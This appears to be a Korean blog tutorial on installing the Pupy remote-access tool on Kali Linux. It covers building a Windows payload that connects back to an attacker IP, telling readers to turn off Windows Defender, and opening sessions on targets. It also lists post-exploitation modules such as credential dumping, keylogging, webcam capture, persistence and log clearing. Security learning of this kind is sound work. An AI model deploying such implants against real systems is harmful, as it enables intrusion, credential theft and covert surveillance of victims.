{"pageProps":{"post":{"slug":"2018-02-26-Pupy-install","content":"\n## 설치\n\n### 환경 : Kali Linux,VMware Workstation 12 pro\n\n참고 : https://github.com/n1nj4sec/pupy\n```\ngit clone https://github.com/n1nj4sec/pupy.git pupy\ncd pupy\ngit submodule init\ngit submodule update\npip install -r pupy/requirements.txt\nwget https://github.com/n1nj4sec/pupy/releases/download/latest/payload_templates.txz\ntar xvf payload_templates.txz && mv payload_templates/* pupy/payload_templates/ && rm payload_templates.txz && rm -r payload_templates\n```\n\n#### PUPY 설치\n 1. git clone https://github.com/n1nj4sec/pupy.git\n![](/assets/posts/kali/pupy_git.png)\n 2. cd pupy\n 3. git submodule init\n![](/assets/posts/kali/pupy_init.png)\n\n 4. git submodule update\n![](/assets/posts/kali/pupy_update.png)\n\n 5. pip install -r pupy/requirements.txt\n\n★설치가 안되거나 에러가 발생하는 경우 밑에 필요하다고 뜨는 것들을 설치해보면서 에러를 해결하시면 됩니다.\n\n\n## 사용법\n★공격자 ip는 ifconfig로 확인하시길 바랍니다.\n![](/assets/posts/kali/pupy_ifconfig.png)\n\n```\n./pupygen.py -O (타겟의 운영체제) -A (타겟의 아키텍쳐) -o (파일명.확장자) connect --host  (공격자 IP) --transport ssl \n\n./pupygen.py  -O windows -A x64 -o MitNy.exe  connect --host 000.000.000.000 --transport ssl\n```\n\n![](/assets/posts/kali/pupy_gen.png)\n저는 파일을 예전에 만들어놨고, VM이 아닌 제 컴퓨터에 직접 파일을 설치해놨었기 때문에 그것을 사용하겠습니다.(mitny.exe)\n자신의 컴퓨터에 직접 테스트를 해보고싶으시면 Windows defender를 끄고 해보세요.\n(절대 악의적인 목적으로 타인의 컴퓨터에 사용하지 마세요. 법적인 책임은 본인에게 있습니다.)\n\n![](/assets/posts/kali/pupy_mitny.png)\n\n\n- pupysh.py 파일 실행\n\n- 패스워드 입력 후 타겟 컴퓨터에서 위에서 만든 파일 실행 시 세션이 잡힘.\n\n- sessions -i 1 -> Session 1이 타겟이 됨\n\n\n![](/assets/posts/kali/pupy_start.png)\n\n`- info 입력시 타겟의 정보가 출력됨`\n\n![](/assets/posts/kali/pupy_info.png)\n\n★ list_modules를 치면 사용 가능한 명령어 리스트를 볼 수 있습니다.\n\n```\nadmin/beroot                 Windows Privilege Escalation\nadmin/clear_logs             Clear Event Logs\nadmin/dns                    Retrieve Domain Name From Ip And Vice Versa\nadmin/drives                 List Valid Drives In The System\nadmin/getdomain              Get Primary Domain Controller\nadmin/igd                    Upnp Igd Client\nadmin/interactive_shell      Open An Interactive Command Shell With A Nice Tty\nadmin/pexec                  Execute Shell Commands Non-Interactively On A Remote System In Background Using Popen\nadmin/psexec                 Launch Remote Commands Using Smbexec Or Wmiexec\nadmin/psh                    Load/Execute Powershell Scripts\nadmin/pyexec                 Execute Python Code On A Remote System\nadmin/pyshell                Open An Interactive Python Shell On The Remote Client\nadmin/rdesktop               Start A Remote Desktop Session Using A Browser Websocket Client\nadmin/rdp                    Enable / Disable Rdp Connection Or Check For Valid Credentials On A Remote Host\nadmin/scapy_shell            Open An Interactive Python Shell On The Remote Client\nadmin/shares                 List Local And Remote Shared Folder And Permission\nadmin/shell_exec             Execute Shell Commands On A Remote System\nadmin/smb                    Copy Files Via Smb Protocol\nadmin/smbspider              Walk Through A Smb Directory And Recursively Search A String Into Files\nadmin/ssh                    Ssh Client\nadmin/zip                    Zip / Unzip File Or Directory\ncreds/changeme               Default Credential Scanner\ncreds/creddump               Download The Hives From A Remote Windows System And Dump Creds\ncreds/lazagne                Retrieve Passwords Stored On The Target\ncreds/loot_memory            Crawl Processes Memory And Look For Cleartext Credentials\ncreds/memstrings             Dump Printable Strings From Process Memory For Futher Analysis\nexploit/exploit_suggester    Exploit Suggester\nexploit/impersonate          List/Impersonate Process Tokens\nexploit/mimikatz             Execute Mimikatz From Memory\nexploit/shellcode_exec       Executes The Supplied Shellcode On A Client\ngather/check_vm              Check If Running On Virtual Machine\ngather/cloudinfo             Retrieve Ec2/Digitalocean Metadata\ngather/get_hwuuid            Try To Get Uuid (Dmi) Or Machine-Id (Dbus/Linux)\ngather/get_info              Get Some Informations About One Or Multiple Clients\ngather/keylogger             A Keylogger To Monitor All Keyboards Interaction Including The Clipboard :-)\ngather/mouselogger           Log Mouse Clicks And Take Screenshots Of Areas Around It\ngather/netcreds              Sniffs Cleartext Passwords From Interface\ngather/outlook               Interact With Outlook Session Of The Targeted User\ngather/powerview             Execute Powerview Commands\ngather/pywerview             Rewriting Of Some Powerview'S Functionalities In Python\ngather/record_mic            Record Sound With The Microphone !\ngather/screenshot            Take A Screenshot :)\ngather/search                Walk Through A Directory And Recursively Search A String Into Files\ngather/users                 Get Interactive Users\ngather/webcamsnap            Take A Webcam Snap :)\ngeneral/process_kill         Kill A Process\nmanage/download              Download A File/Directory From A Remote System\nmanage/duplicate             Duplicate The Current Pupy Payload By Executing It From Memory\nmanage/getprivs              Manage Current Process Privileges\nmanage/lock_screen           Lock The Session\nmanage/memory_exec           Execute A Executable From Memory\nmanage/migrate               Migrate Pupy Into Another Process Using Reflective Dll Injection\nmanage/persistence           Enables Persistence Via Registry Keys\nmanage/upload                Upload A File/Directory To A Remote System\nnetwork/forward              Local/Remote Port Forwarding And Socks Proxy\nnetwork/nbnsspoof            Sniff For Nbns Requests And Spoof Nbns Responses\nnetwork/port_scan            Run A Tcp Port Scan\nnetwork/portfwd              Perform Local/Remote Port Forwarding Using Openssh -L/-R Syntax\nnetwork/socks5proxy          Start A Socks5 Proxy Going Through A Client\nnetwork/tcpdump              Module To Reproduce Some Of The Classic Tcpdump Tool Functions\nprivesc/bypassuac            Try To Bypass Uac\nprivesc/getsystem            Try To Get Nt Authority System Privileges\nprivesc/inveigh              Execute Inveigh Commands\ntroll/msgbox                 Pop Up A Custom Message Box\n```\n","layout":"post","title":"[Kali] PUPY 설치 및 사용법","categories":["Kali"],"excerpt":" ","comments":true,"share":true,"published":false,"tags":["Kali Linux","Pupy","install"]}},"__N_SSG":true}